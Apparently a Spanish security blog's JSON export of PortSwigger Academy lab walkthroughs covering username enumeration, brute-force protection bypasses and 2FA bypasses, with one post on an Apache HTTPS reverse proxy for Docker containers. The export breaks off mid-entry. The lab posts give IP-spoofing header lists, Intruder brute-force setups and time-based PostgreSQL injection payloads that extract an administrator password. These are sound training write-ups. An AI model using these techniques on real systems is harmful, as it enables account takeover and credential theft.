[{"content":"Lab: 2FA broken logic En este laboratorio1la finalidad es hacer un bypass al segundo factor de autenticacion, se nos da un email de cliente en el cual recibiremos el codigo y se nos da los usuarios wiener y carlos basandonos en estos haremos posible hacer el bypass para el usuario carlos.\nReconocimiento En el email de wiener sera en el que recibiremos el correo con el codigo de seguridad al intentar iniciar con la contrasena peter. Al iniciar sesion con las credenciales, luego se nos pide el codigo de seguridad.\n Intruder inicio de sesion \nY si vamos a la pestana de email client recibimos el codigo de seguridad.\n Codigo de seguridad para usuario wiener \nExplotacion En este caso ya que no contamos con la contrasena del usuario carlos haremos un account takeover y tambien pasando una configuracion de seguridad incorrecta en el 2FA que permite enviar multiples codigos de seguridad sin bloquearnos.\nNotamos que al iniciar con credenciales correctas de wiener:peter el sistema envia una cookie llamada verify=wiener lo que nos da a entender que esta validando al usuario wiener su segundo factor de autenticacion, y si es correcto lo redirigira con una cookie asignada a su perfil.\n Cookie del usuario wiener \nSi enviamos nuestro codigo que hemos recibido en el correo, ingresa automaticamente al perfil de wiener, y es aca donde esta la vulnerabilidad, ya que tenemos una cookie pero que aun no tiene asignado un perfil podremos utilizarla para acceder con el usuario carlos y con intruder generar un ataque de sniper el cual inyecte numeros del 1111 al 1999 hasta que encontremos el codigo que sea el correcto. En este caso vamos a repetir el proceso pero lo vamos a interceptar y al momento que se llegue a esta peticion lo enviaremos al intruder y le damos drop para que la cookie la podamos utilizar en intruder.\n Configuracion de posicion de payloads   Configuracion de payload set con valores de 1111 a 9999 \nYa que tenemos los resultados, notamos que existe una respuesta 302 que es la que nos redirige a nuestro perfil. Asi que ya tenemos una cookie valida para poder ingresar al perfil de carlos.\n Resultado de intruder \nLuego de esto burpsuite cuenta con una funcion interesante que es ver la respuesta en el navegador dando clic derecho y Show response in browser por lo que copiamos el link y lo pegamos en el navegador\n Ver respuesta de burpsuite en navegador \nAl pegar esta direccion en el navegador ya nos redirige al perfil de carlos y hemos resuelto el lab.\n Laboratorio resuelto \n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-22T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/","title":"Portswigger Academy Learning Path: Authentication Lab 8"},{"content":"Lab: 2FA bypass using a brute-force attack En este laboratorio1la finalidad es hacer un bypass al segundo factor de autenticacion, se nos da unas credenciales que son carlos:montoya y luego de esto se nos pide el segundo factor de autenticacion y la idea es saltarselo para poder ingresar.\nReconocimiento Al iniciar sesion con las credenciales, se puede notar que se pide el 2FA si las credenciales son correctas. Pero este hace uso de csrf-token y como todo token va cambiando y enviandose por lo que si usamos algo como repeater el codigo ya no funcionara mas.\n Token CSRF enviado en peticion \nEl proceso de iniciio de sesion es el siguiente, luego de iniciar credenciales por lo que pide el codigo 2FA.\n 2FA en el inicio de sesion \nPero notamos que al intentar mas de 2 codigos de 2FA el sistema vuelve a pedir las credenciales nuevamente.\n Inicio de sesion continuo al 2 intentos erroneos \nY si vamos a la pestana de email client recibimos el codigo de seguridad.\nExplotacion Ya que se cuenta con un token csrf nos complica y que tambien despues de dos intentos se nos vuelven a pedir credenciales, por lo que automatizar el ataque se nos complica. Pero burpsuite cuenta con el uso de macros lo que nos permitira automatizar todo el proceso. Para eso se sigue el siguiente proceso:\n Paso 1   Paso 2   Paso 3   Paso 4 \nLos pasos anteriores lo que hace, es crear una macro de todos los pasos que hace nuestra consulta para antes de poder enviar el codigo, toda esta macro nos realizara el proceso para poder aplicar fuerza bruta en el 2FA y resolverlo. Algo a recordar es siempre dar test macro para poder validad que la macro funcione correctamente.\nDespues de todo este proceso ya podemos realizar el ataque con intruder ya que la macro anteriormente definida, para eso enviamos la peticion donde es enviada el codigo 2FA a intruder.\n Intruder 2FA \nSeteamos valores de 0001 hasta 9999, diciendo que tenga el tamano de 4 y sin decimales\n Payloadas 2FA \nSeteamos tambien que solo se envie una peticion y no se maneje por hilos ya que al ser token csrf no funcionaria el envio de demasiadas peticiones\n Resource Pool 2FA \nAhora lanzamos el ataque y esperar, se nos muestra una respuesta con codigo 302 que es la correcta. Asi que damos show response in browser, lo pegamos en el link y con eso ya tenemos acceso a la cuenta de carlos.\n Respuestas del servidor \nAl pegar esta direccion en el navegador ya nos redirige al perfil de carlos y hemos resuelto el lab.\n Laboratorio resuelto \n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-22T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/","title":"Portswigger Academy Learning Path: Authentication Lab 9"},{"content":"Problema Actualmente cuento con un vps el cual uso muy poco pero queria utilizarlo mas seguido, por lo cual me di a la tarea de tener un dns el cual me bloquee todo el trafico malicioso o de publicidad, la primera opcion fue Pi-Hole que utilice anteriormente aunque existen otras opciones como Adguard Home pero que algun dia probare. Para esto queria que todo estuviera centralizado y no tener que acceder a traves de puertos a los servicios como pihole o algun otro docker que quiera levantar mas adelante. ya que no quiero acceder por dominio.com:port para cada servicio sino que segun lo que ingrese se me redirija hacia el puerto 443 automaticamente.\nPara eso lo que hare es que cuando se acceda a los siguientes dominios, sea automaticamente redirigido a un docker por el proxy reverso de apache y evitar colocar puertos y que se maneje todo por subdominios y forzando las comunicaciones a https.\n https://pi.dominio.com/ https://wordpress.dominio.com/  Resolucion Para esto me apoyare del siguiente software para solucionar este problema.\n Apache Docker Certbot  Configuracion de contenedores docker Actualmente solo tengo 1 contenedor arriba, que es pihole pero hare un ejemplo si tuviera un wordpress adicional a este para poder acceder a traves del dominio y todos con un certificado de letsencrypt.\nPi-Hole Container Para pihole existe el siguiente script para poder ejecutarlo, que lo que hara es levantar uno en el puerto 3141 de nuestro vps, pero sin exponerlo a toda internet.\n#!/bin/bash  # https://github.com/pi-hole/docker-pi-hole/blob/master/README.md PIHOLE_BASE=\u0026#34;${PIHOLE_BASE:-$(pwd)}\u0026#34; [[ -d \u0026#34;$PIHOLE_BASE\u0026#34; ]] || mkdir -p \u0026#34;$PIHOLE_BASE\u0026#34; || { echo \u0026#34;Couldn\u0026#39;t create storage directory: $PIHOLE_BASE\u0026#34;; exit 1; } # Note: ServerIP should be replaced with your external ip. docker run -d \\  --name pihole \\  -p 53:53/tcp -p 53:53/udp \\  -p 127.0.0.1:3141:80 \\  -e TZ=\u0026#34;America/Chicago\u0026#34; \\  -v \u0026#34;${PIHOLE_BASE}/etc-pihole/:/etc/pihole/\u0026#34; \\  -v \u0026#34;${PIHOLE_BASE}/etc-dnsmasq.d/:/etc/dnsmasq.d/\u0026#34; \\  --dns=127.0.0.1 --dns=1.1.1.1 \\  --restart=unless-stopped \\  --hostname pi.hole \\  -e VIRTUAL_HOST=\u0026#34;pi.hole\u0026#34; \\  -e PROXY_LOCATION=\u0026#34;pi.hole\u0026#34; \\  -e ServerIP=\u0026#34;127.0.0.1\u0026#34; \\  pihole/pihole:latest printf \u0026#39;Starting up pihole container \u0026#39; for i in $(seq 1 20); do if [ \u0026#34;$(docker inspect -f \u0026#34;{{.State.Health.Status}}\u0026#34; pihole)\u0026#34; == \u0026#34;healthy\u0026#34; ] ; then printf \u0026#39; OK\u0026#39; echo -e \u0026#34;\\n$(docker logs pihole 2\u0026gt; /dev/null | grep \u0026#39;password:\u0026#39;)for your pi-hole: https://${IP}/admin/\u0026#34; exit 0 else sleep 3 printf \u0026#39;.\u0026#39; fi if [ $i -eq 20 ] ; then echo -e \u0026#34;\\nTimed out waiting for Pi-hole start, consult your container logs for more info (\\`docker logs pihole\\`)\u0026#34; exit 1 fi done; Wordpress container Ahora tenemos otro contenedor con wordpress que lo que hace es iniciar una instancia de word y siempre solamente local en el puerto 8002, para esto ya tenemos dos contenedores en los cuales trabajar.\nversion:\u0026#34;3\u0026#34;services:WordPress:image:wordpresslinks:- mariadb:mysqlenvironment:- WORDPRESS_DB_PASSWORD=passwordports:- 127.0.0.1:8001:80volumes:- ./html:/var/www/htmlmariadb:image:mariadbenvironment:- MYSQL_ROOT_PASSWORD=password- MYSQL_DATABASE=wordpressvolumes:- ./database:/var/lib/mysqlGeneracion de certificados de SSL Para esto utilizaremos certbot que nos solucionara la vida, ya que permitira descargar los certificados generados por letsencrypt en nuestra carpeta de archivos, todos estos se guardan en /etc/letsencrypt/live/\nLo primero es en nuestro DNS agregar el CNAME de wordpress y pi apuntando a nuestra ip ya que certbot se basa en esto sino no dejara generar los certificados necesarios ya que hace una comprobacion de la ip y de nombre de DNS. Para esto los generamos con los siguientes comandos:\ncertbot certonly --apache -d pi.dominio.com certbot certonly --apache -d wordpress.dominio.com Y si todo esta correctamente son guardados en la carpeta anterior mencionada, y desde ahi se podran importar a apache. Para configurar que las conexiones solo sean manejadas por HTTPS.\nConfigurar Apache como proxy reverso Para eso debemos de ejecutar las siguientes instrucciones con permisos de root:\napt install apache a2enmod proxy a2enmod proxy_http a2enmod proxy_balancer a2enmod ssl a2enmod rewrite Lo que hara es instalar apache, habilitar los modulos necesarios para redireccion y que actue como gateway, permitir proxear y balancear todo, aparte el habilitar modulo de SSL para que las comunicaciones vayan cifradas por HTTPS y que se pueda redirigir a estas. Ahora solo queda desactivar el puerto 80 y manejar siempre por 443 que es HTTPS, para eso editamos el archivo /etc/apache2/ports.conf.\n# If you just change the port or add more ports here, you will likely also # have to change the VirtualHost statement in # /etc/apache2/sites-enabled/000-default.conf #Listen 80 \u0026lt;IfModule ssl_module\u0026gt; Listen 443 \u0026lt;/IfModule\u0026gt; \u0026lt;IfModule mod_gnutls.c\u0026gt; Listen 443 \u0026lt;/IfModule\u0026gt; # vim: syntax=apache ts=4 sw=4 sts=4 sr noet Ya que habilitamos e instalamos apache, vamos a lo siguiente que es agregar la configuracion para los sitios web a los que se quiere acceder:\ncd /etc/apache2/sites-available/ touch wordpress.conf touch pihole.conf Y en pihole.conf agregamos el siguiente texto que lo que hace es colocar el nombre del virtual host al que accederemos igual al nombre que se coloca en el DNS, la ip y puerto en la que esta expuesto que en nuestro caso es localhost y puerto 3141 y los certificados SSL anteriormente generados con certbot.\npihole.conf\n\u0026lt;VirtualHost *:443\u0026gt; ProxyPreserveHost On ServerName pi.dominio.com ProxyPass / http://127.0.0.1:3141/ ProxyPassReverse / http://127.0.0.1:3141/ SSLEngine On SSLProxyEngine On SSLCertificateFile \u0026quot;/etc/letsencrypt/live/pi.dominio.com/cert.pem\u0026quot; SSLCertificateChainFile \u0026quot;/etc/letsencrypt/live/pi.dominio.com/chain.pem\u0026quot; SSLCertificateKeyFile \u0026quot;/etc/letsencrypt/live/pi.dominio.com/privkey.pem\u0026quot; \u0026lt;/VirtualHost\u0026gt; Para wordpress es similar y solo se cambia de puerto\nwordpress.conf\n\u0026lt;VirtualHost *:443\u0026gt; ProxyPreserveHost On ServerName wordpress.dominio.com ProxyPass / http://127.0.0.1:8001/ ProxyPassReverse / http://127.0.0.1:8001/ SSLEngine On SSLProxyEngine On SSLCertificateFile \u0026quot;/etc/letsencrypt/live/wordpress.dominio.com/cert.pem\u0026quot; SSLCertificateChainFile \u0026quot;/etc/letsencrypt/live/wordpress.dominio.com/chain.pem\u0026quot; SSLCertificateKeyFile \u0026quot;/etc/letsencrypt/live/wordpress.dominio.com/privkey.pem\u0026quot; \u0026lt;/VirtualHost\u0026gt; teniendo esto ya solamente queda reiniciar apache o si ya lo habra pedido antes tambien hacerlo si es necesario.\nsystemctl reload apache2 Y si accedemos a traves de internet a pi.dominio.com y wordpress.dominio.com ya deberia entrar sin problema y a traves de HTTPS con certificados de Lets Encrypt.\n","date":"2021-11-21T00:00:00Z","image":"https://www.alux.cc/p/multiples-contenedores-y-proxy-inverso-apache-https/head_hu344c5e2ed235c4957dd8b33b636c0e47_153790_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/multiples-contenedores-y-proxy-inverso-apache-https/","title":"Multiples contenedores y Proxy Inverso Apache + HTTPS"},{"content":"Lab: Broken brute-force protection, multiple credentials per request En este laboratorio1la finalidad es ingresar con un usuario valido, como el que se nos indica que es carlos y se nos da el listado de contrasenas que podemos probar.\nReconocimiento Para resolver el ejercicio se nos da el listado de contrasenas con el que nos podemos autenticar con el usuario carlos, cuando tratamos de ingresar con el usuario se nos muestra una respuesta generica como la siguiente:\n Intruder inicio de sesion \nPero al ver la peticion, vemos que la peticion hace uso de post en formato json de la siguiente manera:\n{ \u0026#34;username\u0026#34;:\u0026#34;carlos\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;test\u0026#34;, \u0026#34;\u0026#34;:\u0026#34;\u0026#34; } Explotacion Ahora que sabemos esto, intentaremos inyectar muchas mas contrasenas en esta misma peticion para evitar el bloqueo al realizar demasiados intentos, debemos saber que para enviar multiples valores en json se deben de enviar dentro de corchetes de la siguiente manera:\n{ \u0026#34;username\u0026#34;:\u0026#34;carlos\u0026#34;, [ \u0026#34;valor1\u0026#34;, \u0026#34;valor2\u0026#34;, \u0026#34;valor3\u0026#34;, ] } Para eso podemos usar el siguiente comando con sed para que de nuestra lista de contrasenas crear la estructura y automatizarlo:\n$ sed \u0026#39;s/^/\u0026#34;/; s/$/\u0026#34;,/\u0026#39; passwords.txt \u0026#34;123456\u0026#34;, \u0026#34;password\u0026#34;, \u0026#34;12345678\u0026#34;, \u0026#34;qwerty\u0026#34;, \u0026#34;123456789\u0026#34;, \u0026#34;12345\u0026#34;, \u0026#34;1234\u0026#34;, \u0026#34;111111\u0026#34;, \u0026#34;1234567\u0026#34;, \u0026#34;dragon\u0026#34;, \u0026#34;123123\u0026#34;, \u0026#34;baseball\u0026#34;, \u0026#34;abc123\u0026#34;, \u0026#34;football\u0026#34;, \u0026#34;monkey\u0026#34;, \u0026#34;letmein\u0026#34;, \u0026#34;shadow\u0026#34;, \u0026#34;master\u0026#34;, \u0026#34;666666\u0026#34;, \u0026#34;qwertyuiop\u0026#34;, \u0026#34;123321\u0026#34;, \u0026#34;mustang\u0026#34;, \u0026#34;1234567890\u0026#34;, \u0026#34;michael\u0026#34;, ... Ahora los enviamos por repeater de la siguiente manera para poder iniciar sesion, lo que nos devuelve una respuesta 302 por lo que ya contamos con una contrasena valida enviada en formato json.\n Envio de peticiones con repeater \nY con eso ya hemos ingresado al usuario de carlos:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-21T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/","title":"Portswigger Academy Learning Path: Authentication Lab 6"},{"content":"Lab: 2FA simple bypass En este laboratorio1la finalidad es hacer un bypass al segundo factor de autenticacion, se nos da un email de cliente en el cual recibiremos el codigo y se nos da los usuarios wiener y carlos basandonos en estos haremos posible hacer el bypass para el usuario carlos.\nReconocimiento En el email de wiener sera en el que recibiremos el correo con el codigo de seguridad al intentar iniciar con la contrasena peter. Al iniciar sesion con las credenciales, luego se nos pide el codigo de seguridad.\n Intruder inicio de sesion \nY si vamos a la pestana de email client recibimos el codigo de seguridad.\n Codigo de seguridad para usuario wiener \nExplotacion En este caso la manera de hacer el bypass es muy facil, practicamente la aplicacion no valida el codigo, ya con ingresar usuario y contrasena ya se puede entrar al sistema.\n Historial HTTP \nNotamos que luego ingresar el codigo en /login2 redirigira a la pagina /my-account. Si nos saltamos el enviar el codigo y vamos directamente a la pagina /my-account ya habremos resuelto el lab.\n El sistema no valida nunca el codigo 2FA ya que sin ingresarlo ya puede ingresar a ciertos modulos de la aplicacion\n Y con eso ya hemos ingresado al usuario de carlos:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-21T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/","title":"Portswigger Academy Learning Path: Authentication Lab 7"},{"content":"Lab: Broken brute-force protection, IP block En este laboratorio1la finalidad es ingresar con la cuenta de carlos, pero tiene una funcionalidad que lo que hace es bloquear nuestra ip al maximo de intentos que son 3, despues de esos intentos sale una alerta que muestra que se estan realizando demasiados intentos.\nReconocimiento Para resolver el ejercicio se nos da un listado de usuarios y contrasenas para realizar las pruebas, al intentar iniciar sesion podemos notar la respuesta del inicio de sesion al realizar mas de 3 intentos en el usuario carlos.\n Respuesta al realizar muchos intentos de inicio de sesion \nExplotacion Ahora que sabemos esto, se nos da un usuario valido que es wiener con la contrasena peter y al tratar de ingresar vemos que accede, pero algo importante al notar es que al iniciar sesion y luego se vuelve a intentar con el usuario carlos si deja hacer un nuevo intento otra vez y a la tercera vez se bloquea. Por lo que se sabe que si iniciamos sesion con un usuario valido el contador vuelve a 0.\nAhora queda armar los payloads para realizar el ataque, que es intentar con el usuario valido y luego con la contrasena para carlos para que el contador siempre vuelva a 0 cada que se intenta. Para eso utilizamos intruder con el tipo de ataque Pitchfork que lo que hara es el payload de posicion 1 se intente con el 1 y el 2 con el posicion 2 y asi sucesivamente.\n Algo a notar es que los payloads set del 1 deben de ser igual en conteo al de payload set 2, es decir si el set 1 tiene 100 valores en su lista, debe tener los mismos en el set 2\n Creacion de lista usuarios Para eso y crear una lista de 200 ya que las contrasenas a intentar son 100, y se van a intercalar wiener y carlos\nprint((\u0026#34;wiener\\ncarlos\\n\u0026#34;)*100) Creacion de lista contrasenas Lo siguiente es intercalar entre las contrasenas que se probaran a carlos, por eso agregamos el valor peter antes de cada linea con un salto de linea los que nos crea una lista de payloads.\nsed \u0026#39;s/^/peter\\n/\u0026#39; passwords.txt Ahora que tenemos los payloads hacemos lo siguiente de hacer el ataque de tipo Pitchfork y los set de payloads como los mostrados, donde primero se prueba el usuario wiener:peter luego carlos:pass1,pass2,...\n Intruder Position   Intruder Payloads \nAl realizar el ataque ya podemos ver que wiener:peter tiene respuesta de tipo 302 asi que si se ingresa una contrasena valida a carlos este tambien sera la contrasena correcta como se muestra.\n Respuestas del ataque de usuarios \nYa con esto tenemos la contrasena y podemos iniciar sesion. Y con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-20T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/","title":"Portswigger Academy Learning Path: Authentication Lab 4"},{"content":"Lab: Username enumeration via account lock En este laboratorio1la finalidad es ingresar con un usuario valido, pero antes debemos hacer una enumeracion para saber que usuario existe o no en la aplicacion.\nReconocimiento Para resolver el ejercicio se nos da un listado de usuarios y contrasenas para realizar las pruebas, asi que con el uso de intruder copiamos 4 veces los usuarios para que se traten de ingresar 4 veces con una contrasena cualquiera. Y aca hay un usuario que si existe se bloqueara por un minuto, como se muestra que el usuario ar se bloquea.\n Intruder inicio de sesion \nExplotacion Ahora que sabemos esto, intentaremos entrar con el usuario ar pero hay que tener cuidado que no se nos bloquee la cuenta, en este caso si se bloquea, pero la propia aplicacion tiene una falla la cual aunque se bloquea la cuenta el mensaje es diferente para el usuario valido lo que permite reconocer que el usuario y contrasena si es valido porque muestra un error distinto al resto, y solo queda esperar que la aplicacion se desbloquee luego de un tiempo.\nLos valores enviados son:\n Intruder Position   Intruder Payloads \nAl realizar el ataque ya podemos ver los resultados y el de contrasena starwars es el unico diferente al resto por lo que nos indica que es la contrasena correcta.\n Respuestas del ataque de usuarios \nY con eso ya hemos ingresado:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-20T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/","title":"Portswigger Academy Learning Path: Authentication Lab 5"},{"content":"Lab: Username enumeration via different responses En este laboratorio1la finalidad es enumerar usuarios en el inicio de sesion y dependiendo de la respuesta sabremos si el usuario esta registrado o no.\nReconocimiento Para resolver el ejercicio se nos da el siguiente listado de usuarios2 y contrasenas3para realizar las pruebas, al intentar iniciar sesion podemos notar la respuesta del inicio de sesion:\n Respuesta al iniciar sesion con usuario incorrecto \nExplotacion Basandonos en la respuesta sabremos identificar usuarios en el sistema, solo toca enviar los multiples usuarios y saber cual esta registrado, utilizando la lista de usuarios antes mencionados. Para eso lanzamos el ataque:\n Intruder Position   Intruder Payloads \nY al lanzar el ataque obtuvimos la respuesta, y aunque la respuesta es muy parecida, en un usuario da una respuesta diferente con el length 3008 y es la donde ya nos dice que es Incorrect password lo cual ya hemos enumerado al usuario.\n Respuestas del ataque de usuarios \nYa ahora solo queda lanzar el mismo ataque pero con el listado de contrasenas al usuario auth.\n Respuestas del ataque de contrasenas \nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n Listado de Usuarios\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n Listado de Contrasenas\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-13T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-1/","title":"Portswigger Academy Learning Path: Authentication Lab 1"},{"content":"Lab: Username enumeration via different responses En este laboratorio1la finalidad es enumerar usuarios en el inicio de sesion y dependiendo de la respuesta sabremos si el usuario esta registrado o no, pero aca hay una sutil diferencia y es que la respuesta aunque pareciera ser igual, no es igual y esos son los pequenos cambios a notar.\nReconocimiento Para resolver el ejercicio se nos da un listado de usuarios y contrasenas para realizar las pruebas, al intentar iniciar sesion podemos notar la respuesta del inicio de sesion, que ya no dice que el usuario es incorrecto, sino que es mas generico.\n Respuesta al iniciar sesion con usuario incorrecto \nExplotacion Basandonos en la respuesta sabremos identificar usuarios en el sistema, solo toca enviar los multiples usuarios y saber cual esta registrado, utilizando la lista de usuarios antes mencionados. Para eso lanzamos el ataque:\n Intruder Position   Intruder Payloads \nY al lanzar el ataque obtuvimos muchas respuestas, todas muy similares, para eso haremos de la funcion de burp Grep - Match con el valor Invalid username or password. y veremos si alguna respuesta cambia a esta.\n Respuestas del ataque de usuarios \nComo vemos esta esa respuesta sutil, ya que la respuesta que es la correcta hace falta un . y eso puede hacer la diferencia al enumerar usuarios. Ya ahora solo queda lanzar el mismo ataque pero con el listado de contrasenas al usuario auth. Ahora probaremos el listado de contrasenas, y encontramos basandonos en la respuesta basandonos en la respuesta 302 que es diferente al resto ya que nos redirige.\n Respuestas del ataque de contrasenas \nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-13T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-2/","title":"Portswigger Academy Learning Path: Authentication Lab 2"},{"content":"Lab: Username enumeration via different responses En este laboratorio1la finalidad es enumerar usuarios en el inicio de sesion y dependiendo de la respuesta sabremos si el usuario esta registrado o no, pero el sistema cuenta con una proteccion que no permite mas de 3 intentos para realizar brute forcing por lo que tiene rate limit, por lo que antes de tratar de enumerar usuarios hay que encontrar la manera de hacer un bypass a esto.\nReconocimiento Para resolver el ejercicio se nos da un listado de usuarios y contrasenas para realizar las pruebas, al intentar iniciar sesion podemos notar la respuesta del inicio de sesion, que ya no dice que el usuario es incorrecto, sino que es mas generico.\n Respuesta al realizar muchos intentos de inicio de sesion \nLo primero para saltarse esto existen maneras, una de las cuales puede ser se lista:\nX-Originating-IP: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Client-IP: 127.0.0.1 X-Host: 127.0.0.1 X-Forwared-Host: 127.0.0.1 #or use double X-Forwared-For header X-Forwarded-For: X-Forwarded-For: 127.0.0.1 Las listas se pueden encontrar en la lista de seclists2.\nExplotacion Ahora que podemos saltar este bloqueo ya podemos seguir con el ataque. Basandonos en la respuesta sabremos identificar usuarios en el sistema, solo toca enviar los multiples usuarios y saber cual esta registrado, utilizando la lista de usuarios antes mencionados. Para eso lanzamos el ataque y cambiando la posicion 1 con numeros y valores aleatorios para generar el cambio de ip aleatorio y que no se bloquee la solicitud. Algo a notar es que ya que esta solicitud hace una validacion de usuario y contrasena por lo que si enviamos una contrasena muy larga el sistema tardara mucho mas en enviarnos la respuesta.\n Intruder Position   Intruder Payloads \nAl realizar el ataque ya tenemos resultados y nos fijaremos en el tiempo de la respuesta recibida, en este caso el usuario es af.\n Respuestas del ataque de usuarios \nComo vemos esta la respuesta tarda en recibir, por lo que ahora haremos el mismo proceso, pero cambiando la posicion a la contrasena con el listado de contrasenas, y recibimos uno con codigo de respuesta 302 asi que la contrasena es jennifer.\n Respuestas del ataque de contrasenas \nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n Lista de seclists http-request-headers\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-13T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-3/","title":"Portswigger Academy Learning Path: Authentication Lab 3"},{"content":"Lab: Blind SQL injection with time delays En este laboratorio1la finalidad es poder explotar una vulnerabilidad de sql injection pero basandose en tiempo, la cual se utilizara posteriormente para poder extraer los datos del usuario y contrasena de la tabla usuers.\nReconocimiento Basandonos en la siguiente lista2encontramos que inyectando la siguiente consulta podemos ejecutar un delay, sabiendo que la aplicacion es backend postgresql.\nxxxxxxxxx' AND 1337=(SELECT 1337 FROM PG_SLEEP(10)) AND '1337'='1337 //inyectar esto no dejara ejecutar conditional time delay xxxxxxxxx'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- //%3B para no tener conflicto en repeater al colocar ';' en la cookie Podemos inyectar las siguientes consultas para crearla:\n   Backend Consulta SQL     Oracle SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN \u0026lsquo;a\u0026rsquo;||dbms_pipe.receive_message((\u0026lsquo;a\u0026rsquo;),10) ELSE NULL END FROM dual   Microsoft IF (YOUR-CONDITION-HERE) WAITFOR DELAY \u0026lsquo;0:0:10\u0026rsquo;   PostgreSQL SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END   MySQL SELECT IF(YOUR-CONDITION-HERE,sleep(10),\u0026lsquo;a\u0026rsquo;)    Payloads Ahora toca crear una consulta para extraer los valores de la contrasena de la tabla users, creando la siguiente consulta, sabiendo que es postgresql. Como en los anteriores sabemos que son 20 caracteres en este caso vamos a utilizar la siguiente consulta, utilizando clusterbomb, el primero como valor numero de 1 a 20 y el 2 con una lista de caracteres alfanumericos.\n\u0026#39;%3BSELECT CASE WHEN (username=\u0026#39;administrator\u0026#39; and substr(password,\u0026lt;valor cambiante 1 a 20\u0026gt;,1)=\u0026#39;valoralfanumerico\u0026#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--  Ataque con intruder \nY con esto ya tenemos la contrasena del usuario administrator que es ifp6pjrl8u4oy2xp9e3b. Y algo a tomar en cuenta es al hacer inyecciones de este tipo, la respuesta de las peticiones al hacerse juntas la respuesta tardara igual en todas, asi que lo justo es no enviar en hilos ya que no sabremos cual sera la respuesta que tarde mas ya que se replicara en varias respuestas.\nExtraer datos Y con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n Lista de Payloads SQL Injection Time Based\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-11T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/","title":"Portswigger Academy Learning Path: SQL Injection Lab 14"},{"content":"Lab: Blind SQL injection with out-of-band interaction En este laboratorio1la finalidad es poder inyectar una consulta sql y basandonos en la ejecucion que pueda realizar el backend una consulta hacia un endpoint y genere una accion, en este caso de esto se trata. Mas que todo donde los otros tipos de 